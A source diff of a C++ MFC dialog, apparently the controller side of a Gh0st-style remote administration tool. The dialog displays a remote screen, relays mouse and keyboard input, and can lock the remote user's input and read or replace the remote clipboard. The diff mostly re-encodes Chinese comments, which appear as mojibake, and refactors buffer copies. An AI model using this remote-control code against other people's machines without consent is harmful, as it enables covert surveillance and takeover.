@@ -1,4 +1,4 @@
-// ScreenSpyDlg.cpp : ÊµÏÖÎÄ¼ş
+ï»¿// ScreenSpyDlg.cpp : å®ç°æ–‡ä»¶
 //
 
 #include "stdafx.h"
@@ -8,18 +8,18 @@
 #include <imm.h>
 
 
-// CScreenSpyDlg ¶Ô»°¿ò
+// CScreenSpyDlg å¯¹è¯æ¡†
 
 enum
 {
 	IDM_CONTROL = 0x1010,
 	IDM_FULLSCREEN, 
 	IDM_SEND_CTRL_ALT_DEL,
-	IDM_TRACE_CURSOR,	// ¸ú×ÙÏÔÊ¾Ô¶³ÌÊó±ê
-	IDM_BLOCK_INPUT,	// Ëø¶¨Ô¶³Ì¼ÆËã»úÊäÈë
-	IDM_SAVEDIB,		// ±£´æÍ¼Æ¬
-	IDM_GET_CLIPBOARD,	// »ñÈ¡¼ôÌù°å
-	IDM_SET_CLIPBOARD,	// ÉèÖÃ¼ôÌù°å
+	IDM_TRACE_CURSOR,	// è·Ÿè¸ªæ˜¾ç¤ºè¿œç¨‹é¼ æ ‡
+	IDM_BLOCK_INPUT,	// é”å®šè¿œç¨‹è®¡ç®—æœºè¾“å…¥
+	IDM_SAVEDIB,		// ä¿å­˜å›¾ç‰‡
+	IDM_GET_CLIPBOARD,	// è·å–å‰ªè´´æ¿
+	IDM_SET_CLIPBOARD,	// è®¾ç½®å‰ªè´´æ¿
 };
 
 IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
@@ -29,7 +29,7 @@ IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
 CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: CDialog(CScreenSpyDlg::IDD, Parent)
 {
-	ImmDisableIME(0);// ½ûÓÃÊäÈë·¨
+	ImmDisableIME(0);// ç¦ç”¨è¾“å…¥æ³•
 	m_bFullScreen = FALSE;
 
 	m_iocpServer	= IOCPServer;
@@ -37,7 +37,7 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJEC
 
 	CHAR szFullPath[MAX_PATH];
 	GetSystemDirectory(szFullPath, MAX_PATH);
-	lstrcat(szFullPath, "\\shell32.dll");  //Í¼±ê
+	lstrcat(szFullPath, "\\shell32.dll");  //å›¾æ ‡
 	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
 	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance, MAKEINTRESOURCE(IDC_ARROWS));
 
@@ -54,8 +54,7 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJEC
 
 	ULONG	ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
 	m_BitmapInfor_Full = (BITMAPINFO *) new BYTE[ulBitmapInforLength];
-
-	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), ulBitmapInforLength);
+	m_ContextObject->InDeCompressedBuffer.CopyBuffer(m_BitmapInfor_Full, ulBitmapInforLength, 1);
 
 	m_bIsCtrl = FALSE;
 	m_bIsTraceCursor = FALSE;
@@ -78,7 +77,7 @@ CScreenSpyDlg::~CScreenSpyDlg()
 	}
 
 	::ReleaseDC(m_hWnd, m_hFullDC);   //GetDC
-	::DeleteDC(m_hFullMemDC);                //CreateÆ¥ÅäÄÚ´æDC
+	::DeleteDC(m_hFullMemDC);                //CreateåŒ¹é…å†…å­˜DC
 
 	::DeleteObject(m_BitmapHandle);
 	if (m_BitmapData_Full!=NULL)
@@ -108,7 +107,7 @@ BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
 END_MESSAGE_MAP()
 
 
-// CScreenSpyDlg ÏûÏ¢´¦Àí³ÌĞò
+// CScreenSpyDlg æ¶ˆæ¯å¤„ç†ç¨‹åº
 
 
 BOOL CScreenSpyDlg::OnInitDialog()
@@ -117,37 +116,37 @@ BOOL CScreenSpyDlg::OnInitDialog()
 	SetIcon(m_hIcon,FALSE);
 
 	CString strString;
-	strString.Format("%s - Ô¶³Ì×ÀÃæ¿ØÖÆ %d¡Á%d", m_strClientIP, 
+	strString.Format("%s - è¿œç¨‹æ¡Œé¢æ§åˆ¶ %dÃ—%d", m_strClientIP, 
 		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
 	SetWindowText(strString);
 
 	m_hFullDC = ::GetDC(m_hWnd);
 	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
 	m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
-		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //´´½¨Ó¦ÓÃ³ÌĞò¿ÉÒÔÖ±½ÓĞ´ÈëµÄ¡¢ÓëÉè±¸ÎŞ¹ØµÄÎ»Í¼
+		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //åˆ›å»ºåº”ç”¨ç¨‹åºå¯ä»¥ç›´æ¥å†™å…¥çš„ã€ä¸è®¾å¤‡æ— å…³çš„ä½å›¾
 
-	SelectObject(m_hFullMemDC, m_BitmapHandle);//ÔñÒ»¶ÔÏóµ½Ö¸¶¨µÄÉè±¸ÉÏÏÂÎÄ»·¾³
+	SelectObject(m_hFullMemDC, m_BitmapHandle);//æ‹©ä¸€å¯¹è±¡åˆ°æŒ‡å®šçš„è®¾å¤‡ä¸Šä¸‹æ–‡ç¯å¢ƒ
 
-	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  //Ö¸¶¨¹ö¶¯Ìõ·¶Î§µÄ×îĞ¡ÖµºÍ×î´óÖµ
+	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  //æŒ‡å®šæ»šåŠ¨æ¡èŒƒå›´çš„æœ€å°å€¼å’Œæœ€å¤§å€¼
 	SetScrollRange(SB_VERT, 0, m_BitmapInfor_Full->bmiHeader.biHeight);//1366  768
 
 	CMenu* SysMenu = GetSystemMenu(FALSE);
 	if (SysMenu != NULL)
 	{
 		SysMenu->AppendMenu(MF_SEPARATOR);
-		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "¿ØÖÆÆÁÄ»(&Y)");
-		SysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "È«ÆÁ(&F)");
-		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "¸ú×Ù±»¿Ø¶ËÊó±ê(&T)");
-		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "Ëø¶¨±»¿Ø¶ËÊó±êºÍ¼üÅÌ(&L)");
-		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "±£´æ¿ìÕÕ(&S)");
+		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "æ§åˆ¶å±å¹•(&Y)");
+		SysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "å…¨å±(&F)");
+		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "è·Ÿè¸ªè¢«æ§ç«¯é¼ æ ‡(&T)");
+		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "é”å®šè¢«æ§ç«¯é¼ æ ‡å’Œé”®ç›˜(&L)");
+		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "ä¿å­˜å¿«ç…§(&S)");
 		SysMenu->AppendMenu(MF_SEPARATOR);
-		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "»ñÈ¡¼ôÌù°å(&R)");
-		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "ÉèÖÃ¼ôÌù°å(&L)");
+		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "è·å–å‰ªè´´æ¿(&R)");
+		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "è®¾ç½®å‰ªè´´æ¿(&L)");
 		SysMenu->AppendMenu(MF_SEPARATOR);
 	}
 
-	m_bIsCtrl = FALSE;   //²»ÊÇ¿ØÖÆ
-	m_bIsTraceCursor = FALSE;  //²»ÊÇ¸ú×Ù
+	m_bIsCtrl = FALSE;   //ä¸æ˜¯æ§åˆ¶
+	m_bIsTraceCursor = FALSE;  //ä¸æ˜¯è·Ÿè¸ª
 	m_ClientCursorPos.x = 0;
 	m_ClientCursorPos.y = 0;
 	m_bCursorIndex = 0;
@@ -177,7 +176,7 @@ VOID CScreenSpyDlg::OnReceiveComplete()
 {
 	assert (m_ContextObject);
 
-	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
+	switch(m_ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
 	case TOKEN_FIRSTSCREEN:
 		{
@@ -186,7 +185,7 @@ VOID CScreenSpyDlg::OnReceiveComplete()
 		}
 	case TOKEN_NEXTSCREEN:
 		{
-			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1]==ALGORITHM_DIFF)
+			if (m_ContextObject->InDeCompressedBuffer.GetBYTE(1)==ALGORITHM_DIFF)
 			{
 				DrawNextScreenDiff();
 			}
@@ -194,8 +193,8 @@ VOID CScreenSpyDlg::OnReceiveComplete()
 		}
 	case TOKEN_CLIPBOARD_TEXT:
 		{
-			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
-				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
+			Buffer str = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
+			UpdateServerClipboard(str.c_str(), str.length());
 			break;
 		}
 	}
@@ -205,19 +204,19 @@ VOID CScreenSpyDlg::DrawFirstScreen(void)
 {
 	m_bIsFirst = FALSE;
 
-	//µÃµ½±»¿Ø¶Ë·¢À´µÄÊı¾İ £¬½«Ëû¿½±´µ½HBITMAPµÄ»º³åÇøÖĞ£¬ÕâÑùÒ»¸öÍ¼Ïñ¾Í³öÏÖÁË
-	memcpy(m_BitmapData_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_BitmapInfor_Full->bmiHeader.biSizeImage);
+	//å¾—åˆ°è¢«æ§ç«¯å‘æ¥çš„æ•°æ® ï¼Œå°†ä»–æ‹·è´åˆ°HBITMAPçš„ç¼“å†²åŒºä¸­ï¼Œè¿™æ ·ä¸€ä¸ªå›¾åƒå°±å‡ºç°äº†
 
-	PostMessage(WM_PAINT);//´¥·¢WM_PAINTÏûÏ¢
+	m_ContextObject->InDeCompressedBuffer.CopyBuffer(m_BitmapData_Full, m_BitmapInfor_Full->bmiHeader.biSizeImage, 1);
+	PostMessage(WM_PAINT);//è§¦å‘WM_PAINTæ¶ˆæ¯
 }
 
 VOID CScreenSpyDlg::DrawNextScreenDiff(void)
 {
-	//¸Ãº¯Êı²»ÊÇÖ±½Ó»­µ½ÆÁÄ»ÉÏ£¬¶øÊÇ¸üĞÂÒ»ÏÂ±ä»¯²¿·ÖµÄÆÁÄ»Êı¾İÈ»ºóµ÷ÓÃ
-	//OnPaint»­ÉÏÈ¥
-	//¸ù¾İÊó±êÊÇ·ñÒÆ¶¯ºÍÆÁÄ»ÊÇ·ñ±ä»¯ÅĞ¶ÏÊÇ·ñÖØ»æÊó±ê£¬·ÀÖ¹Êó±êÉÁË¸
+	//è¯¥å‡½æ•°ä¸æ˜¯ç›´æ¥ç”»åˆ°å±å¹•ä¸Šï¼Œè€Œæ˜¯æ›´æ–°ä¸€ä¸‹å˜åŒ–éƒ¨åˆ†çš„å±å¹•æ•°æ®ç„¶åè°ƒç”¨
+	//OnPaintç”»ä¸Šå»
+	//æ ¹æ®é¼ æ ‡æ˜¯å¦ç§»åŠ¨å’Œå±å¹•æ˜¯å¦å˜åŒ–åˆ¤æ–­æ˜¯å¦é‡ç»˜é¼ æ ‡ï¼Œé˜²æ­¢é¼ æ ‡é—ªçƒ
 	BOOL	bChange = FALSE;
-	ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ±êÊ¶ + Ëã·¨ + ¹â±ê Î»ÖÃ + ¹â±êÀàĞÍË÷Òı
+	ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // æ ‡è¯† + ç®—æ³• + å…‰æ ‡ ä½ç½® + å…‰æ ‡ç±»å‹ç´¢å¼•
 	LPVOID	FirstScreenData = m_BitmapData_Full;
 	LPVOID	NextScreenData = m_ContextObject->InDeCompressedBuffer.GetBuffer(ulHeadLength);
 	ULONG	NextScreenLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - ulHeadLength;
@@ -226,30 +225,30 @@ VOID CScreenSpyDlg::DrawNextScreenDiff(void)
 	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
 	memcpy(&m_ClientCursorPos, m_ContextObject->InDeCompressedBuffer.GetBuffer(2), sizeof(POINT));
 
-	// Êó±êÒÆ¶¯ÁË
+	// é¼ æ ‡ç§»åŠ¨äº†
 	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0)
 	{
 		bChange = TRUE;
 	}
 
-	// ¹â±êÀàĞÍ·¢Éú±ä»¯
+	// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
 	BYTE bOldCursorIndex = m_bCursorIndex;
 	m_bCursorIndex = m_ContextObject->InDeCompressedBuffer.GetBuffer(2+sizeof(POINT))[0];
 	if (bOldCursorIndex != m_bCursorIndex)
 	{
 		bChange = TRUE;
-		if (m_bIsCtrl && !m_bIsTraceCursor)//Ìæ»»Ö¸¶¨´°¿ÚËùÊôÀàµÄWNDCLASSEX½á¹¹
+		if (m_bIsCtrl && !m_bIsTraceCursor)//æ›¿æ¢æŒ‡å®šçª—å£æ‰€å±ç±»çš„WNDCLASSEXç»“æ„
 			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
 	}
 
-	// ÆÁÄ»ÊÇ·ñ±ä»¯
+	// å±å¹•æ˜¯å¦å˜åŒ–
 	if (NextScreenLength > 0) 
 	{
 		bChange = TRUE;
 	}
 
-	//lodsdÖ¸Áî´ÓESIÖ¸ÏòµÄÄÚ´æÎ»ÖÃ4¸ö×Ö½ÚÄÚÈİ·ÅÈëEAXÖĞ²¢ÇÒÏÂÒÆ4
-	//movsbÖ¸Áî×Ö½Ú´«ËÍÊı¾İ£¬Í¨¹ıSIºÍDIÕâÁ½¸ö¼Ä´æÆ÷¿ØÖÆ×Ö·û´®µÄÔ´µØÖ·ºÍÄ¿±êµØÖ·
+	//lodsdæŒ‡ä»¤ä»ESIæŒ‡å‘çš„å†…å­˜ä½ç½®4ä¸ªå­—èŠ‚å†…å®¹æ”¾å…¥EAXä¸­å¹¶ä¸”ä¸‹ç§»4
+	//movsbæŒ‡ä»¤å­—èŠ‚ä¼ é€æ•°æ®ï¼Œé€šè¿‡SIå’ŒDIè¿™ä¸¤ä¸ªå¯„å­˜å™¨æ§åˆ¶å­—ç¬¦ä¸²çš„æºåœ°å€å’Œç›®æ ‡åœ°å€
 	//m_rectBuffer [0002 esi0002 esi000A 000C]     [][]edi[][][][][][][][][][][][][][][][][]
 	__asm
 	{
@@ -258,15 +257,15 @@ VOID CScreenSpyDlg::DrawNextScreenDiff(void)
 		jmp	CopyEnd
 CopyNextBlock:
 		mov edi, [FirstScreenData]
-		lodsd	            // °ÑlpNextScreenµÄµÚÒ»¸öË«×Ö½Ú£¬·Åµ½eaxÖĞ,¾ÍÊÇDIBÖĞ¸Ä±äÇøÓòµÄÆ«ÒÆ
-			add edi, eax	// lpFirstScreenÆ«ÒÆeax	
-			lodsd           // °ÑlpNextScreenµÄÏÂÒ»¸öË«×Ö½Ú£¬·Åµ½eaxÖĞ, ¾ÍÊÇ¸Ä±äÇøÓòµÄ´óĞ¡
+		lodsd	            // æŠŠlpNextScreençš„ç¬¬ä¸€ä¸ªåŒå­—èŠ‚ï¼Œæ”¾åˆ°eaxä¸­,å°±æ˜¯DIBä¸­æ”¹å˜åŒºåŸŸçš„åç§»
+			add edi, eax	// lpFirstScreenåç§»eax	
+			lodsd           // æŠŠlpNextScreençš„ä¸‹ä¸€ä¸ªåŒå­—èŠ‚ï¼Œæ”¾åˆ°eaxä¸­, å°±æ˜¯æ”¹å˜åŒºåŸŸçš„å¤§å°
 			mov ecx, eax
-			sub ebx, 8      // ebx ¼õÈ¥ Á½¸ödword
-			sub ebx, ecx    // ebx ¼õÈ¥DIBÊı¾İµÄ´óĞ¡
+			sub ebx, 8      // ebx å‡å» ä¸¤ä¸ªdword
+			sub ebx, ecx    // ebx å‡å»DIBæ•°æ®çš„å¤§å°
 			rep movsb
 CopyEnd:
-		cmp ebx, 0 // ÊÇ·ñĞ´ÈëÍê±Ï
+		cmp ebx, 0 // æ˜¯å¦å†™å…¥å®Œæ¯•
 			jnz CopyNextBlock
 	}
 
@@ -283,7 +282,7 @@ void CScreenSpyDlg::OnPaint()
 
 	if (m_bIsFirst)
 	{
-		DrawTipString("ÇëµÈ´ı......");
+		DrawTipString("è¯·ç­‰å¾…......");
 		return;
 	}
 
@@ -313,11 +312,11 @@ VOID CScreenSpyDlg::DrawTipString(CString strString)
 {
 	RECT Rect;
 	GetClientRect(&Rect);
-	//COLORREFÓÃÀ´Ãè»æÒ»¸öRGBÑÕÉ«
+	//COLORREFç”¨æ¥æç»˜ä¸€ä¸ªRGBé¢œè‰²
 	COLORREF  BackgroundColor = RGB(0x00, 0x00, 0x00);	
 	COLORREF  OldBackgroundColor  = SetBkColor(m_hFullDC, BackgroundColor);
 	COLORREF  OldTextColor = SetTextColor(m_hFullDC, RGB(0xff,0x00,0x00));
-	//ExtTextOutº¯Êı¿ÉÒÔÌá¹©Ò»¸ö¿É¹©Ñ¡ÔñµÄ¾ØĞÎ£¬ÓÃµ±Ç°Ñ¡ÔñµÄ×ÖÌå¡¢±³¾°ÑÕÉ«ºÍÕıÎÄÑÕÉ«À´»æÖÆÒ»¸ö×Ö·û´®
+	//ExtTextOutå‡½æ•°å¯ä»¥æä¾›ä¸€ä¸ªå¯ä¾›é€‰æ‹©çš„çŸ©å½¢ï¼Œç”¨å½“å‰é€‰æ‹©çš„å­—ä½“ã€èƒŒæ™¯é¢œè‰²å’Œæ­£æ–‡é¢œè‰²æ¥ç»˜åˆ¶ä¸€ä¸ªå­—ç¬¦ä¸²
 	ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);
 
 	DrawText (m_hFullDC, strString, -1, &Rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);
@@ -329,7 +328,7 @@ VOID CScreenSpyDlg::DrawTipString(CString strString)
 
 void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 {
-	// TODO: ÔÚ´ËÌí¼ÓÏûÏ¢´¦Àí³ÌĞò´úÂëºÍ/»òµ÷ÓÃÄ¬ÈÏÖµ
+	// TODO: åœ¨æ­¤æ·»åŠ æ¶ˆæ¯å¤„ç†ç¨‹åºä»£ç å’Œ/æˆ–è°ƒç”¨é»˜è®¤å€¼
 	CMenu* SysMenu = GetSystemMenu(FALSE);
 
 	switch (nID)
@@ -340,27 +339,27 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
 			break;
 		}
-	case IDM_FULLSCREEN: // È«ÆÁ
+	case IDM_FULLSCREEN: // å…¨å±
 		{
 			EnterFullScreen();
-			SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //²Ëµ¥ÑùÊ½
+			SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //èœå•æ ·å¼
 			break;
 		}
-	case IDM_SAVEDIB:    // ¿ìÕÕ±£´æ
+	case IDM_SAVEDIB:    // å¿«ç…§ä¿å­˜
 		{
 			SaveSnapshot();
 			break;
 		}
-	case IDM_TRACE_CURSOR: // ¸ú×Ù±»¿Ø¶ËÊó±ê
+	case IDM_TRACE_CURSOR: // è·Ÿè¸ªè¢«æ§ç«¯é¼ æ ‡
 		{	
-			m_bIsTraceCursor = !m_bIsTraceCursor; //ÕâÀïÔÚ¸Ä±äÊı¾İ
-			SysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);//ÔÚ²Ëµ¥´ò¹³²»´ò¹³
+			m_bIsTraceCursor = !m_bIsTraceCursor; //è¿™é‡Œåœ¨æ”¹å˜æ•°æ®
+			SysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);//åœ¨èœå•æ‰“é’©ä¸æ‰“é’©
 
-			// ÖØ»æÏû³ı»òÏÔÊ¾Êó±ê
+			// é‡ç»˜æ¶ˆé™¤æˆ–æ˜¾ç¤ºé¼ æ ‡
 			OnPaint();
 			break;
 		}
-	case IDM_BLOCK_INPUT: // Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ
+	case IDM_BLOCK_INPUT: // é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜
 		{
 			BOOL bIsChecked = SysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
 			SysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -371,13 +370,13 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
 			break;
 		}
-	case IDM_GET_CLIPBOARD: //ÏëÒªClientµÄ¼ôÌù°åÄÚÈİ
+	case IDM_GET_CLIPBOARD: //æƒ³è¦Clientçš„å‰ªè´´æ¿å†…å®¹
 		{
 			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
 			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
 			break;
 		}
-	case IDM_SET_CLIPBOARD: //¸øËû
+	case IDM_SET_CLIPBOARD: //ç»™ä»–
 		{
 			SendServerClipboard();
 			break;
@@ -416,7 +415,7 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 	case WM_KEYUP:
 	case WM_SYSKEYDOWN:
 	case WM_SYSKEYUP:
-		if (pMsg->wParam == VK_F11 && LeaveFullScreen()) // F11: ÍË³öÈ«ÆÁ
+		if (pMsg->wParam == VK_F11 && LeaveFullScreen()) // F11: é€€å‡ºå…¨å±
 			return TRUE;
 		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
 		{
@@ -428,7 +427,7 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 			SendCommand(&Msg);
 		}
 		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
-			return TRUE;// ÆÁ±ÎEnterºÍESC¹Ø±Õ¶Ô»°
+			return TRUE;// å±è”½Enterå’ŒESCå…³é—­å¯¹è¯
 		break;
 	}
 
@@ -452,7 +451,7 @@ VOID CScreenSpyDlg::SendCommand(MSG* Msg)
 BOOL CScreenSpyDlg::SaveSnapshot(void)
 {
 	CString	strFileName = m_strClientIP + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
-	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "Î»Í¼ÎÄ¼ş(*.bmp)|*.bmp|", this);
+	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "ä½å›¾æ–‡ä»¶(*.bmp)|*.bmp|", this);
 	if(Dlg.DoModal () != IDOK)
 		return FALSE;
 
@@ -464,12 +463,12 @@ BOOL CScreenSpyDlg::SaveSnapshot(void)
 		return FALSE;
 	}
 
-	// BITMAPINFO´óĞ¡
+	// BITMAPINFOå¤§å°
 	//+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD)
 	//bmp  fjkdfj  dkfjkdfj [][][][]
 	int	nbmiSize = sizeof(BITMAPINFO);
 
-	//Ğ­Òé  TCP    Ğ£ÑéÖµ
+	//åè®®  TCP    æ ¡éªŒå€¼
 	BitMapFileHeader.bfType			= ((WORD) ('M' << 8) | 'B');	
 	BitMapFileHeader.bfSize			= BitMapInfor->bmiHeader.biSizeImage + sizeof(BitMapFileHeader);  //8421
 	BitMapFileHeader.bfReserved1 	= 0;                                          //8000
@@ -506,16 +505,16 @@ VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength)
 
 VOID CScreenSpyDlg::SendServerClipboard(void)
 {
-	if (!::OpenClipboard(NULL))  //´ò¿ª¼ôÇĞ°åÉè±¸
+	if (!::OpenClipboard(NULL))  //æ‰“å¼€å‰ªåˆ‡æ¿è®¾å¤‡
 		return;
-	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //´ú±í×ÅÒ»¸öÄÚ´æ
+	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //ä»£è¡¨ç€ä¸€ä¸ªå†…å­˜
 	if (hGlobal == NULL)
 	{
 		::CloseClipboard();
 		return;
 	}
 	int	  iPacketLength = GlobalSize(hGlobal) + 1;
-	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //Ëø¶¨ 
+	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //é”å®š 
 	LPBYTE	szBuffer = new BYTE[iPacketLength];
 
 	szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
@@ -650,14 +649,14 @@ void CScreenSpyDlg::EnterFullScreen()
 	}
 }
 
-// È«ÆÁÍË³ö³É¹¦Ôò·µ»Øtrue
+// å…¨å±é€€å‡ºæˆåŠŸåˆ™è¿”å›true
 bool CScreenSpyDlg::LeaveFullScreen()
 {
 	if (m_bFullScreen)
 	{
 		SetWindowPlacement(&m_struOldWndpl);
 		CMenu *SysMenu = GetSystemMenu(FALSE);
-		SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_UNCHECKED); //²Ëµ¥ÑùÊ½
+		SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_UNCHECKED); //èœå•æ ·å¼
 		m_bFullScreen = false;
 		return true;
 	}
